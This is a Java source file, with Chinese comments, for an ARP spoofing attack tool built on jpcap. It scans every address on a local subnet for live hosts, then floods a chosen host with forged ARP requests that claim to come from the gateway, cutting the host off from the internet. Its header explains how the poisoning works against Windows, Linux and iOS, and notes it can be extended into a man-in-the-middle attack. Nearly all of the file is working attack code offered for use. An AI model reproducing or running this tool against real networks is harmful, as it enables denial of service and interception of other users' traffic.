package cn.qiuyukang;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.*;

/**
 * ARP 局域网攻击程序, 可以扫描并攻击局域网内的其它主机，使其无法连接外网
 *
 * @author QiuYukang
 * @version V1.0
 * <p>
 * ARP攻击：
 * 1. 伪造ARP响应或者请求，重写主机的 ARP 缓存表中的默认网关信息
 * 主机会自动过滤所有未请求的响应，但 Windows是不会过滤来自重写已有条目的新的 ARP 响应
 * 针对 Windows主机:
 * ①.发送一个源 ip 为网关 ip, 源 mac 为伪造 mac 地址的 ARP 响应包给指定 Windows 主机，
 * 直接重写指定主机默认网关的 arp 表项。
 * ②.发送一个源 ip 为网关 ip, 源 mac 为伪造 mac 地址的 ARP 请求包给指定 Windows 主机，
 * 让指定主机自己主动识别并修改默认网关的 arp 表项。
 * <p>
 * 针对 Linux主机:
 * ①.发送一个源 ip 为网关 ip, 源 mac 为伪造 mac 地址的 ARP 请求包给指定 Windows 主机，
 * 让指定主机自己主动识别并修改默认网关的 arp 表项。
 * <p>
 * 针对 IOS 设备：
 * ①.测试发现 ios 设备居然可以检测出形如 "11-11-11-11-11-11" 的简单 mac 地址是无效mac地址，
 * IOS 设备收到伪造的 arp 请求时发现无效 mac 地址则不会刷新 arp 表项，也不会回应该 arp 请求，
 * 建议直接把伪造的 mac地址改成攻击者的 mac 地址或较为复杂的 mac 地址。
 * <p>
 * PS：伪造的 mac 地址可以改成攻击者的 mac 地址，这样还可以在攻击者电脑上抓包到被攻击者的数据，
 * 进一步进行 arp 中间人攻击！
 */
public class ARPAttack {
    /**
     * 获取本机所有网络接口信息
     *
     * @return 网络接口设备数组 NetworkInterface[]
     */
    public static NetworkInterface[] getAllNIC() {
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            System.out.println("NIC " + i + "\nname:" + devices[i].description +
                    "\nip:" + devices[i].addresses[1].address.getHostAddress() +
                    "\nmac:" + macToS(devices[i].mac_address));
            System.out.println("");
        }

        return devices;
    }

    // 把字符串表示的mac地址变成byte数组
    public static byte[] sToMac(String s) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] s1 = s.split("-");

        for (int x = 0; x < s1.length; x++) {
            // byte范围是-128到127,而mac地址的一个字节最大值FF是255,所以变成byte后可能会自动溢出变成负数
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }

        return mac;
    }

    // 把byte数组表示的mac地址变成6字节字符串表示的mac地址
    public static String macToS(byte[] mac) {
        StringBuilder s = new StringBuilder();

        for (byte b : mac) {
            s.append(String.format("%02x", b & 0xff) + "-");
        }

        return s.deleteCharAt(s.length() - 1).toString();
    }

    /**
     * 构造一个用以太封装的 ARP 分组
     *
     * @param operation Request=1, Reply=2
     * @param srcIP     点分十进制表示的源 ip 地址
     * @param srcMac    形如 "00-0C-29-95-AF-C8" 的源 mac 地址
     * @param desIp     点分十进制表示的源 ip 地址
     * @param desMac    形如 "00-0C-29-95-AF-C8" 的目的 mac 地址
     * @return 以太封装的 ARP 分组
     * @throws UnknownHostException ip 地址不合法
     */
    public static ARPPacket createARP(short operation, String srcIP, String srcMac, String desIp, String desMac)
            throws UnknownHostException {
        // 构造ARP包
        ARPPacket arpPacket = new ARPPacket();
        InetAddress srcip = InetAddress.getByName(srcIP);
        byte[] srcmac = sToMac(srcMac);
        InetAddress desip = InetAddress.getByName(desIp);
        byte[] desmac = sToMac(desMac);

        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.operation = operation;
        arpPacket.sender_hardaddr = srcmac;
        arpPacket.sender_protoaddr = srcip.getAddress();
        arpPacket.target_hardaddr = desmac;
        arpPacket.target_protoaddr = desip.getAddress();

        // 构造以太帧头
        EthernetPacket ethernetPacket = new EthernetPacket();
        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethernetPacket.src_mac = srcmac;
        if (operation == ARPPacket.ARP_REQUEST) {
            ethernetPacket.dst_mac = sToMac("ff-ff-ff-ff-ff-ff");
        } else {
            ethernetPacket.dst_mac = desmac;
        }

        arpPacket.datalink = ethernetPacket;

        return arpPacket;
    }

    /**
     * 获取网络接口设备的网关 ip (只能获取网关是 x.x.x.1的情况)
     *
     * @param device 网络接口设备
     * @return
     */
    public static String getGatewayAddr(NetworkInterface device) {
        //通过设备 ip 地址获取子网地址，进而获取子网内所有 ip 地址
        String hostIpAddr = device.addresses[1].address.getHostAddress();
        /* split表达式，其实就是一个正则表达式。
           而 * . ^ | 等符号在正则表达式中属于一种有特殊含义的字符，
           如果使用此种字符作为分隔符，必须使用转义符即\\加以转义。
        */
        String[] addrFlagments = hostIpAddr.split("\\.");
        String gatewayAddr = addrFlagments[0] + "." + addrFlagments[1] +
                "." + addrFlagments[2] + ".1";

        return gatewayAddr;

    }

    /**
     * 获取子网内的所有 ip 地址(广播地址和网络地址除外)
     *
     * @param netAddr 网络地址 形如 "192.168.31.0" （默认只能处理.0结尾）
     * @return x.x.x.1~x.x.x.254 地址集合
     */
    public static List<String> getAllIp(String netAddr) {
        List<String> ips = new ArrayList<>();
        String ip = netAddr.substring(0, netAddr.length() - 1);

        for (int i = 1; i < 255; i++) {
            ips.add(ip + i);
        }

        return ips;
    }

    /**
     * 获取局域网内所有存活的主机 ip 的对应的 mac 地址
     *
     * @param device 网络接口设备
     * @return key 点分十进制 ip, value 为该ip对应的 mac 地址的存活主机的 map
     * @throws Exception
     */
    public static Map<String, byte[]> arpScan(NetworkInterface device)
            throws Exception {
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 200);
        // 过滤出第 7 到 7+1 字节值为 2 的 arp 分组(ARP Reply)
        captor.setFilter("arp[7:1] == 2", true);

        Map<String, byte[]> ipAndMac = new HashMap<>();
        JpcapSender sender = captor.getJpcapSenderInstance();
        String netAddr = getGatewayAddr(device);
        List<String> ips = getAllIp(netAddr);

        System.out.println("ARP 扫描开始，预计耗时 2min......");

        for (String ip : ips) {
            ARPPacket packet = createARP(ARPPacket.ARP_REQUEST,
                    device.addresses[1].address.getHostAddress(),
                    macToS(device.mac_address),
                    ip, "00-00-00-00-00-00");
            sender.sendPacket(packet);
            // System.out.println("send arp request to \"" + ip + "\"");

            // 抓取回复
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null || !Arrays.equals(p.target_hardaddr, device.mac_address)) {
                System.out.println("\"" + ip + "\" isn't exits.");
            } else {
                System.out.println("\"" + ip + "\"'s mac address is: " + macToS(p.sender_hardaddr));
                ipAndMac.put(ip, p.sender_hardaddr);
            }
        }

        System.out.println("\nARP 扫描结束！扫描到局域网内存活主机信息如下：");
        for (String ip : ipAndMac.keySet()) {
            System.out.println("ip: " + ip + "  mac:" + macToS(ipAndMac.get(ip)));
        }

        return ipAndMac;
    }

    public static void attackHosts() {

    }

    /**
     * 对特定主机进行 arp 攻击，重写被攻击主机 arp 表项中网关的 mac 地址
     *
     * @param device  网络接口设备
     * @param ip      需要攻击的主机点分十进制 ip 地址,例如 "192.168.31.11"
     * @param fakeMac 需要伪造的网关 mac 地址,例如 "F0-76-1C-BF-8B-EF"
     * @throws Exception 抛出异常 IOException 和 UnknownHostException
     */
    public static void attackHost(NetworkInterface device, String ip, String fakeMac) throws Exception {
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 500);
        JpcapSender sender = captor.getJpcapSenderInstance();
        String gateway = getGatewayAddr(device);

        // 伪造一个来自网关的 arp 请求，请求中的发送者mac为伪造 mac 地址，以此重写被攻击主机的 arp 表项
        ARPPacket packet = createARP(ARPPacket.ARP_REQUEST, gateway, fakeMac,
                ip, "00-00-00-00-00-00");

        System.out.println("正在对主机 \""  + ip + "\" 发动 ARP 攻击......");
        for (int i = 0; i < 1000; i++) {
            sender.sendPacket(packet);
            Thread.sleep(100);
        }
    }
}
